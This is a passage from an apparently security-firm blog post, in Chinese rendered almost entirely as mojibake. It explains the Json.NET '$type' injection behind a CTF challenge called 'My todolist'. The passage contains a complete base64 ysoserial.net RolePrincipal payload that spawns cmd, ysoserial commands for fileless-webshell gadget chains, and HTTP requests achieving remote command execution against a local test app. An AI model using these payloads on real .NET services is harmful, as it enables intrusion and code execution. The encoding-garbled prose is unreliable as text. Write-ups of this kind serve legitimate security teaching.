<p>ç•¶æˆ‘å€‘åºåˆ—åŒ– Dictionary æ™‚ï¼Œæˆ‘å€‘æ‰€æ’å…¥çš„ä»»ä½• key å’Œ value çš„ pair éƒ½å’Œ <code class="language-plaintext highlighter-rouge">$type</code> å±¬æ€§å€¼åœ¨åŒä¸€å€‹å±¤ç´šï¼Œé‚£å‡è¨­æˆ‘å€‘ Dictionary å…§å«æœ‰å€¼ç‚º <code class="language-plaintext highlighter-rouge">$type</code> çš„ key æ™‚ï¼Œæœƒç™¼ç”Ÿä»€éº¼äº‹æƒ…ï¼Ÿ</p>

<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">&gt;</span> <span class="n">source</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">&gt;();</span>
<span class="n">source</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"$type"</span><span class="p">,</span> <span class="s">"System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"</span><span class="p">);</span>
<span class="n">JsonSerializerSettings</span> <span class="n">settings</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JsonSerializerSettings</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">All</span>
<span class="p">};</span>
<span class="n">JsonConvert</span><span class="p">.</span><span class="nf">DeserializeObject</span><span class="p">(</span><span class="n">JsonConvert</span><span class="p">.</span><span class="nf">SerializeObject</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">settings</span><span class="p">),</span> <span class="n">settings</span><span class="p">);</span>
</code></pre></div></div>

<p>æœƒå¾—åˆ°ä¸€å€‹ä¾‹å¤–éŒ¯èª¤ï¼š</p>
<blockquote>
  <p>Newtonsoft.Json.JsonSerializationException: â€˜Type specified in JSON â€˜System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aâ€™ is not compatible with â€˜System.Collections.Generic.Dictionary`2[[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089],[System.String, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089]], mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089â€™. Path â€˜$typeâ€™, line 1, position 236.â€™</p>
</blockquote>

<p>è‹¥å»ºç«‹ debug æ–·é»å°‡ JsonConvert.SerializeObject çš„çµæœå­—ä¸²å°å‡ºä¾†æœƒå¾—åˆ°ï¼š</p>
<div class="language-json highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span><span class="w">
    </span><span class="nl">"$type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"System.Collections.Generic.Dictionary`2[[System.String, mscorlib],[System.String, mscorlib]], mscorlib"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"$type"</span><span class="p">:</span><span class="w"> </span><span class="s2">"System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"</span><span class="w">
</span><span class="p">}</span><span class="w">
</span></code></pre></div></div>

<p>å…¶å¯¦å¾é€™æ®µéŒ¯èª¤è¨Šæ¯å°±å¯ä»¥çŒœæ¸¬å‡ºå¤§è‡´å‡ºéŒ¯çš„å¯èƒ½æ€§ï¼Œå¦‚æœå†ç¨å¾®è¿½å…¥ç¨‹å¼ç¢¼å°±æœƒç™¼ç¾ï¼Œæˆ‘å€‘è¨­å®šçš„ç¬¬äºŒå€‹ $type ç¢ºå¯¦æˆåŠŸè®“ Json.NET å˜—è©¦å»è¦†è“‹ç¬¬ä¸€å€‹ $type æŒ‡å®šçš„ç‰©ä»¶é¡å‹ï¼Œä½† Json.NET åœ¨é€™æ®µçš„è™•ç†æœƒæª¢æŸ¥ç¬¬äºŒå€‹ç‰©ä»¶é¡å‹æ˜¯å¦èƒ½å¤ ç›¸å®¹æ–¼ç¬¬ä¸€å€‹ç‰©ä»¶é¡å‹ï¼Œä¹Ÿå°±æ˜¯æª¢æŸ¥æ˜¯å¦ assignableï¼Œè‹¥æˆ‘å€‘èƒ½æ‰¾åˆ°æŸå€‹é¡ Dictionary ç‰©ä»¶å¯ä»¥æˆç‚º gadget çš„è©±ï¼Œé€™æ®µç¨‹å¼ç¢¼ä¹Ÿè¨±å°‡æˆç‚º exploitableã€‚</p>

<p>ä½†è¦æŒ–æ˜æ–°çš„ gadget ååˆ†å›°é›£ï¼Œè€Œä¸”å°±ç®—æ‰¾åˆ°äº†ï¼Œè¦ä½œç‚º Wargame é¡Œç›®ä¹Ÿå¯èƒ½éæ–¼åˆé›£ï¼Œæ‰€ä»¥æˆ‘é€™é‚Šæ‰¾åˆ°äº†ä¸€ç¨®è®Šç¨®æƒ…å¢ƒï¼Œé›–ç„¶æ˜¯ä¸å¸¸è¦‹çš„è¨­å®šï¼Œä½†æˆ‘è¦ºå¾—ä½œç‚ºä¸€é“é¡Œç›®æƒ…å¢ƒçš„è©±æœƒéå¸¸æœ‰è¶£ã€‚</p>

<p>é€™å€‹é¡Œç›®æƒ…å¢ƒçš„é—œéµæ˜¯ <a href="https://www.newtonsoft.com/json/help/html/deserializemetadatapropertyhandling.htm">MetadataPropertyHandling.ReadAhead</a> é€™å€‹è¨­å®šå€¼ï¼Œç•¶æä¾›çµ¦ JsonConvert.DeserializeObject çš„ JsonSerializerSettings ä¸­æœ‰åŒ…å« MetadataPropertyHandling.ReadAhead æ™‚ï¼Œå®ƒæœƒå‡è¨­ $type ä¸æ˜¯åœ¨ç¬¬ä¸€å€‹å±¬æ€§å€¼çš„ä½ç½®ï¼Œé€™æœƒå°è‡´ Json.NET å…ˆå˜—è©¦å¾é ­åˆ°å°¾æŠŠ JSON è§£æå®Œä¸¦æ‰¾å‡º $type å¾Œæ‰é–‹å§‹å»ºç«‹ç‰©ä»¶ï¼Œåœ¨æ­¤æƒ…å¢ƒä¸‹ä¹Ÿæœƒè®“æˆ‘å€‘æ³¨å…¥çš„ç¬¬äºŒå€‹ $type ç›´æ¥è¦†è“‹ç¬¬ä¸€å€‹ $type çš„å€¼ï¼Œæ‰€ä»¥å‡å¦‚ç¨‹å¼ç¢¼æ”¹å¯«ç‚ºå¦‚ä¸‹çš„ç¨‹å¼ç¢¼æ™‚ï¼Œé€™å€‹ Clone function å°‡æœƒè®Šå¾— exploitableã€‚</p>
<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">&gt;</span> <span class="n">source</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">&gt;();</span>
<span class="n">source</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"you control the key"</span><span class="p">,</span> <span class="s">"you control the value"</span><span class="p">);</span>
<span class="n">JsonSerializerSettings</span> <span class="n">settings</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JsonSerializerSettings</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">All</span><span class="p">,</span>
    <span class="n">MetadataPropertyHandling</span> <span class="p">=</span> <span class="n">MetadataPropertyHandling</span><span class="p">.</span><span class="n">ReadAhead</span>
<span class="p">};</span>
<span class="n">JsonConvert</span><span class="p">.</span><span class="nf">DeserializeObject</span><span class="p">(</span><span class="n">JsonConvert</span><span class="p">.</span><span class="nf">SerializeObject</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">settings</span><span class="p">),</span> <span class="n">settings</span><span class="p">);</span>
</code></pre></div></div>

<p>æˆ‘å€‘å¯ä»¥ä¾†å¯¦éš›åˆ©ç”¨ä¸€å€‹ gadget é€²è¡Œ code execution æ¸¬è©¦ï¼Œé€™é‚Šæˆ‘ä½¿ç”¨ ysoserial.net ç”¢ç”Ÿ RolePrincipal gadget çš„ payload ( <code class="language-plaintext highlighter-rouge">ysoserial.exe -g RolePrincipal -f Json.Net -c calc</code> )ï¼Œå› ç‚ºé€™å€‹ gadget åªéœ€è¦æ§åˆ¶ JSON ä¸€å±¤çš„å­—ä¸²å°±å¯ä»¥åŸ·è¡ŒæŒ‡ä»¤ï¼Œé¡Œç›®æƒ…å¢ƒç›¸å°å®¹æ˜“å»ºæ§‹ã€‚</p>

<p>æ¸¬è©¦åŸ·è¡Œï¼š</p>
<div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">&gt;</span> <span class="n">source</span> <span class="p">=</span> <span class="k">new</span> <span class="n">Dictionary</span><span class="p">&lt;</span><span class="kt">string</span><span class="p">,</span> <span class="kt">string</span><span class="p">&gt;();</span>
<span class="n">source</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"$type"</span><span class="p">,</span> <span class="s">"System.Web.Security.RolePrincipal, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"</span><span class="p">);</span>
<span class="n">source</span><span class="p">.</span><span class="nf">Add</span><span class="p">(</span><span class="s">"System.Security.ClaimsPrincipal.Identities"</span><span class="p">,</span> <span class="s">"AAEAAAD/////AQAAAAAAAAAMAgAAAF5NaWNyb3NvZnQuUG93ZXJTaGVsbC5FZGl0b3IsIFZlcnNpb249My4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj0zMWJmMzg1NmFkMzY0ZTM1BQEAAABCTWljcm9zb2Z0LlZpc3VhbFN0dWRpby5UZXh0LkZvcm1hdHRpbmcuVGV4dEZvcm1hdHRpbmdSdW5Qcm9wZXJ0aWVzAQAAAA9Gb3JlZ3JvdW5kQnJ1c2gBAgAAAAYDAAAAswU8P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJ1dGYtMTYiPz4NCjxPYmplY3REYXRhUHJvdmlkZXIgTWV0aG9kTmFtZT0iU3RhcnQiIElzSW5pdGlhbExvYWRFbmFibGVkPSJGYWxzZSIgeG1sbnM9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sL3ByZXNlbnRhdGlvbiIgeG1sbnM6c2Q9ImNsci1uYW1lc3BhY2U6U3lzdGVtLkRpYWdub3N0aWNzO2Fzc2VtYmx5PVN5c3RlbSIgeG1sbnM6eD0iaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93aW5meC8yMDA2L3hhbWwiPg0KICA8T2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KICAgIDxzZDpQcm9jZXNzPg0KICAgICAgPHNkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgICAgICA8c2Q6UHJvY2Vzc1N0YXJ0SW5mbyBBcmd1bWVudHM9Ii9jIGNhbGMiIFN0YW5kYXJkRXJyb3JFbmNvZGluZz0ie3g6TnVsbH0iIFN0YW5kYXJkT3V0cHV0RW5jb2Rpbmc9Int4Ok51bGx9IiBVc2VyTmFtZT0iIiBQYXNzd29yZD0ie3g6TnVsbH0iIERvbWFpbj0iIiBMb2FkVXNlclByb2ZpbGU9IkZhbHNlIiBGaWxlTmFtZT0iY21kIiAvPg0KICAgICAgPC9zZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICA8L3NkOlByb2Nlc3M+DQogIDwvT2JqZWN0RGF0YVByb3ZpZGVyLk9iamVjdEluc3RhbmNlPg0KPC9PYmplY3REYXRhUHJvdmlkZXI+Cw=="</span><span class="p">);</span>
<span class="n">JsonSerializerSettings</span> <span class="n">settings</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">JsonSerializerSettings</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">TypeNameHandling</span> <span class="p">=</span> <span class="n">TypeNameHandling</span><span class="p">.</span><span class="n">All</span><span class="p">,</span>
    <span class="n">MetadataPropertyHandling</span> <span class="p">=</span> <span class="n">MetadataPropertyHandling</span><span class="p">.</span><span class="n">ReadAhead</span>
<span class="p">};</span>
<span class="n">JsonConvert</span><span class="p">.</span><span class="nf">DeserializeObject</span><span class="p">(</span><span class="n">JsonConvert</span><span class="p">.</span><span class="nf">SerializeObject</span><span class="p">(</span><span class="n">source</span><span class="p">,</span> <span class="n">settings</span><span class="p">),</span> <span class="n">settings</span><span class="p">);</span>
</code></pre></div></div>

<p>å˜—è©¦åŸ·è¡Œä»¥ä¸Šç¨‹å¼ç¢¼å¾Œï¼ŒæˆåŠŸå½ˆå‡ºè¨ˆç®—æ©Ÿï¼
<img src="/assets/img/blog/20230918/1.png" alt="" /></p>

<p>æ—¢ç„¶é©—è­‰æ­¤è¨­å®šæ˜¯å¯ä»¥ exploit çš„ï¼Œå‰©ä¸‹å°±æ˜¯åŒ…è£ä¸€å€‹æ‡‰ç”¨ç¨‹å¼çš„æƒ…å¢ƒï¼Œè€Œæœ€çµ‚è¶•å‡ºçš„æˆå“å°±æ˜¯ My todolist é€™é“é¡Œç›®ã€‚</p>

<p>ç†è«–ä¸Šç›´æ¥ä½¿ç”¨ RolePrincipal å°±èƒ½åŸ·è¡Œç³»çµ±æŒ‡ä»¤äº†ï¼Œåªæ˜¯é€™å€‹ exploit åŸ·è¡Œå¾Œä¸æœƒæœ‰ä»»ä½•æŒ‡ä»¤å›é¡¯ï¼Œè€Œæˆ‘å€‘é‚„éœ€è¦å˜—è©¦æ‰¾åˆ°ä¸¦è®€å– flagï¼Œç‚ºäº†å¾ŒçºŒæ›´ä¾¿åˆ©æ“ä½œï¼Œæˆ‘å€‘å¯ä»¥å˜—è©¦å°‡æ¼æ´è½‰æ›æˆ web shellï¼Œè©³ç´°å¯ä»¥åƒè€ƒæˆ‘çš„å¦ä¸€ç¯‡æ–‡ç« ã€Œ<a href="https://devco.re/blog/2020/03/11/play-with-dotnet-viewstate-exploit-and-create-fileless-webshell/">ç©è½‰ ASP.NET VIEWSTATE ååºåˆ—åŒ–æ”»æ“Šã€å»ºç«‹ç„¡æª”æ¡ˆå¾Œé–€ï¼</a>ã€ï¼Œä½†é€™å€‹æ–¹æ³•çš„ gadget æ˜¯éœ€è¦ä½¿ç”¨ BinaryFormatter åŸ·è¡Œ OnDeserialization callback é€²è€Œè§¸ç™¼ gadget chain çš„åŸ·è¡Œï¼Œä½†å¦‚æœä½ æœ‰ clone æœ€æ–°ç‰ˆæœ¬çš„ ysoserial.net ä¾†è‡ªè¡Œç·¨è­¯çš„è©±ï¼Œæœƒç™¼ç¾ help è¨Šæ¯ä¸­å¤šäº†ä¸€å€‹æ–°çš„åƒæ•¸ â€“bgcã€‚</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>--bgc, --bridgedgadgetchains=VALUE
    Chain of bridged gadgets separated by comma (,). 
      Each gadget will be used to complete the next 
      bridge gadget. The last one will be used in the 
      requested gadget. This will be ignored when 
      using the searchformatter argument.
</code></pre></div></div>

<p>æ²’éŒ¯ï¼Œç‚ºé€™å€‹å°ˆæ¡ˆè²¢ç»çš„ç ”ç©¶è€…å€‘æˆåŠŸæ‰¾åˆ° gadget chain å¯¦ç¾å°‡ Json.NET ç­‰éœ€è¦ setter é¡å‹çš„ gadget çš„ formatter è½‰æ›æˆ BinaryFormatter çš„äºŒæ¬¡ååºåˆ—åŒ–ï¼Œå¾è€Œå¯ä»¥åŸ·è¡Œæ›´å¤šçš„ gadgetï¼Œå…¶ä¸­ç•¶ç„¶å°±åŒ…æ‹¬  ActivitySurrogateDisableTypeCheck å’Œ ActivitySurrogateSelectorFromFile é€™å…©å€‹æœ€é‡è¦çš„ gadgetï¼Œæˆ‘å€‘ä¹Ÿå› æ­¤å¯ä»¥å†æ¬¡ä½¿ç”¨é€™å€‹åŠŸèƒ½å¯¦ç¾ååºåˆ—åŒ–æ”»æ“Šåˆ° fileless webshell çš„ exploitï¼
ç”¢ç”Ÿ payload çš„æŒ‡ä»¤ï¼š</p>
<pre><code class="language-!">ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateDisableTypeCheck -c 1

ysoserial.exe -g RolePrincipal -f Json.Net --bgc ActivitySurrogateSelectorFromFile -c ".\ExploitClass.cs;dlls\System.dll;dlls\System.Web.dll"

</code></pre>

<p>æœ€å¾Œé¡Œç›®åªè¦åœ¨æ­£å¸¸è¨»å†Šå¾Œéš¨ä¾¿æ–°å¢ä¸€å€‹ note é€²è¡Œä¿®æ”¹ï¼Œå†åˆ†åˆ¥å°å…©å€‹ payload åŸ·è¡Œä¸€æ¬¡é¡ä¼¼ä¸‹é¢çš„è«‹æ±‚ï¼Œå°±å¯ä»¥é”æˆæœ‰å›é¡¯çš„ RCE äº†ï¼</p>

<p>Request 1:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/Api/UpdateTodo</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8003</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">xx</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">&lt;session&gt;</span>

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&amp;field=$type&amp;value=System.Web.Security.RolePrincipal,+System.Web,+Version%3d4.0.0.0,+Culture%3dneutral,+PublicKeyToken%3db03f5f7f11d50a3a
</code></pre></div></div>

<p>Request 2:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/Api/UpdateTodo</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8003</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">xx</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">&lt;session&gt;</span>

uuid=00c3abe9-1f7c-4cda-8c24-60c59ac01f3f&amp;field=System.Security.ClaimsPrincipal.Identities&amp;value=&lt;payload&gt;
</code></pre></div></div>

<p>Request 3:</p>
<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">POST</span> <span class="nn">/Api/MyProfile</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8003</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/x-www-form-urlencoded</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">10</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">&lt;session&gt;</span>

cmd=whoami
</code></pre></div></div>


                    </div>
                    <!-- æ–‡ç« å…§å®¹ -->
                </div>
            </article>
            <!-- æ–‡ç«  end -->
        </section>
        
         <!-- ä½œè€… -->
        <section>
            <div class="container article_footer">
                <div class="author_info">
                    <a href="/blog/author/cyku">
                        <div class="circle" style="background-image: url(/assets/img/avatar/orig/cyku.png);"></div>
                    </a>
                    <div>
                        <a class="author" href="/blog/author/cyku">
                            <h3>Cyku</h3>
                        </a>
                        <span>Senior Red Team Specialist</span>
                        <p>
                            ä¸€ä½ç†±æ„›ç¶²ç«™æ‡‰ç”¨ç¨‹å¼å®‰å…¨æŠ€è¡“çš„å¤¢æƒ³å®¶ï¼Œ<br />å°ˆé•·æ–¼æ»²é€æ¸¬è©¦ï¼Œå¤¢æƒ³æ˜¯æˆç‚ºå…‰ä¹‹ç¾å°‘å¥³ã€‚
                        </p>
                    </div>
                </div>
            </div>
        </section>
        

        <!-- ç›¸é—œæ–‡ç«  -->
        <section class="recommand articles-list">
            <div class="container">
              
                <!-- ç›¸é—œæ–‡ç«  Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/æœ€æ–°æ¶ˆæ¯">æœ€æ–°æ¶ˆæ¯</a>
                        <span class="tag">
    
                          <a href="/blog/tag/OffSec/">#OffSec</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/OSEE/">#OSEE</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/LiveTraining/">#LiveTraining</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/07/02/webdog-view-on-osee-advanced-windows-exploitation-from-0.1/">å¾ Web ç‹—çš„è¦–è§’çœ‹ OSEE â€” å¾ 0.1 é–‹å§‹çš„ Advanced Windows Exploitation è€ƒè©¦</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/orange">
                            <h3>Orange Tsai</h3>
                        </a>
                    
                        <span class="date">2025-07-02</span>
                        <p class="line-litmit-3">é€™ç¯‡æ–‡ç®—æ˜¯è‡ªå·±æº–å‚™ OSEE è€ƒè©¦çš„ä¸€é»å°å¿ƒå¾—ï¼Œé—œæ–¼èª²ç¨‹å…§å®¹å¤§å®¶å¯ä»¥åƒè€ƒä¸Šä¸€ç¯‡ç”± NiNi æ’°å¯«çš„ã€ŠEXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»ã€‹ï¼Œä¹Ÿå¯ä»¥æœŸå¾…ä¸‹ç¦®æ‹œ Angelboy è¦å‡ºçš„ã€Œæˆ‘ç¨è‡ªé€Ÿé€š OSEE ğŸˆâ€â¬›ã€ï¼
                        </p>
                    </div>
                </article>
              
                <!-- ç›¸é—œæ–‡ç«  Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/æŠ€è¡“å°ˆæ¬„">æŠ€è¡“å°ˆæ¬„</a>
                        <span class="tag">
    
                          <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/Ubuntu/">#Ubuntu</a> <a href="/blog/tag/Advisory/">#Advisory</a> <a href="/blog/tag/Linux/">#Linux</a> <a href="/blog/tag/Kernel/">#Kernel</a> <a href="/blog/tag/AppArmor/">#AppArmor</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/06/26/the-journey-of-bypassing-ubuntus-unprivileged-namespace-restriction/">The Journey of Bypassing Ubuntuâ€™s Unprivileged Namespace Restriction</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/pumpkin">
                            <h3>Pumpkin</h3>
                        </a>
                    
                        <span class="date">2025-06-26</span>
                        <p class="line-litmit-3">è¿‘æœŸ Ubuntu å¯¦ä½œäº†æ–°çš„æ²™ç›’æ©Ÿåˆ¶ä¾†æ¸›å°‘æ”»æ“Šé¢ï¼Œç„¶è€Œå…¶ä¹çœ‹ä¹‹ä¸‹å …ä¸å¯æ‘§ï¼Œä½†ç¶“éç ”ç©¶å¾Œç™¼ç¾ï¼Œç¹éæ–¹å¼ä¸¦æ²’æœ‰æƒ³åƒä¸­é‚£éº¼å›°é›£ï¼æœ¬æ–‡å°‡ä»‹ç´¹æˆ‘å€‘å¦‚ä½•å¾æ ¸å¿ƒå±¤ç´šè‘—æ‰‹æ‰¾å‡ºç¹éæ–¹æ³•ï¼Œä¸¦åˆ†äº«ç ”ç©¶éç¨‹ä¸­é‡åˆ°çš„ä¸€äº›æœ‰è¶£æ•…äº‹ã€‚
                        </p>
                    </div>
                </article>
              
                <!-- ç›¸é—œæ–‡ç«  Item -->
                <article class="article">
                    <div class="content">
                        <a class="category" href="/blog/category/æœ€æ–°æ¶ˆæ¯">æœ€æ–°æ¶ˆæ¯</a>
                        <span class="tag">
    
                          <a href="/blog/tag/OffSec/">#OffSec</a> <a href="/blog/tag/Windows/">#Windows</a> <a href="/blog/tag/OSEE/">#OSEE</a> <a href="/blog/tag/Vulnerability/">#Vulnerability</a> <a href="/blog/tag/LiveTraining/">#LiveTraining</a> 
                        </span>
                        <h2>
                            <a href="/blog/2025/05/22/exp-401-osee-five-days-to-master-a-decade-of-knowledge/">EXP-401 (OSEE)ï¼šç”¨äº”å¤©èª²ç¨‹è¨“ç·´é€šé€åå¹´çš„çŸ¥è­˜é«”ç³»</a> 
                        </h2>
                    
                    
                        <a class="author" href="/blog/author/terrynini">
                            <h3>Terrynini</h3>
                        </a>
                    
                        <span class="date">2025-05-22</span>
                        <p class="line-litmit-3">EXP-401ï¼ˆOSEEï¼‰ï¼Œä¹Ÿå«åš Advanced Windows Exploitationï¼ˆAWEï¼‰ï¼Œæ˜¯ OffSec ä¸­å”¯ä¸€çš„ã€ŒExpertã€ç­‰ç´šèª²ç¨‹ï¼Œä¹Ÿæ˜¯å…¬èªæœ€å›°é›£ã€é€šéç‡æœ€ä½çš„è­‰ç…§
                        </p>
                    </div>
                </article>
              

            </div>
        </section>
    </div>

    <!-- footer -->
    <footer>
<div class="container footer">
    <div class="logo">
        <a href="/">
            <img src="/images/logo.svg"/>
        </a>
        <div class="social">
            <a href="https://www.facebook.com/D3VC0RE"><i class="icon facebook"></i></a>
            <a href="https://twitter.com/d3vc0r3"><i class="icon twitter"></i></a>
        </div>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">æœå‹™</h6>
        <ul>
            <li><a href="/services/red-team/">ç´…éšŠæ¼”ç·´</a></li>
            <li><a href="/services/penetration-test/">æ»²é€æ¸¬è©¦</a></li>
            <li><a href="/services/security-consulting/">è³‡å®‰é¡§å•æœå‹™</a></li>
            <li><a href="/services/security-training/">è³‡å®‰æ•™è‚²è¨“ç·´</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">ç ”ç©¶</h6>
        <ul>
            <li><a href="/research/overview/">ç¸½è¦½æ¦‚è¦</a></li>
            <li><a href="/research/awards/">ç«¶è³½èˆ‡çé …</a></li>
            <li><a href="/research/bug-bounty/">ä¼æ¥­æ¼æ´å›å ±</a></li>
            <li><a href="/research/talks/">åœ‹éš›ç ”è¨æœƒ</a></li>
            <li><a href="/research/cve/">CVE æ¼æ´åˆ—è¡¨</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">å…¬å¸</h6>
        <ul>
            <li><a href="/company/about/">å…¬å¸ç°¡ä»‹</a></li>
            <li><a href="/company/our-team/">åœ˜éšŠæˆå“¡</a></li>
            <li><a href="/company/history/">æˆå°±èˆ‡æ²¿é©</a></li>
            <li><a href="/company/csr/">ä¼æ¥­ç¤¾æœƒè²¬ä»»</a></li>
            <li><a href="/company/jobs/">å·¥ä½œæ©Ÿæœƒ</a></li>
            <li><a href="/contact/">è¯çµ¡æˆ‘å€‘</a></li>
        </ul>
    </div>

    <div class="column">
        <h6 class="mobile_toggle">æ–°è</h6>
        <ul>
            <li><a href="/blog/">BLOG</a></li>
            <li><a href="/media-kit/">åª’é«”ç´ æä¸‹è¼‰</a></li>
        </ul>
    </div>

    <!-- divider åˆ†éš”ç·š -->
    <div class="divider"></div>

    <div class="copyright">
        <div class="info">
            <span>Â© 2025 DEVCORE æˆ´å¤«å¯‡çˆ¾è‚¡ä»½æœ‰é™å…¬å¸. <b class="line-block">All rights reserved.</b></span>
            <span><a href="/privacy-policy/">Privacy Policy</a></span>
        </div>
        <div class="lang">
            <!-- <i class="icon translate"></i>
            <select>
                <option value="">Language</option>
                <option value="">ä¸­æ–‡</option>
                <option value="">English</option>
            </select> -->
            <span>Language :<a href="/">ä¸­æ–‡</a>|<a href="/en/">English</a></span>
        </div>
    </div>

</div>
    </footer>
</body>
</html>

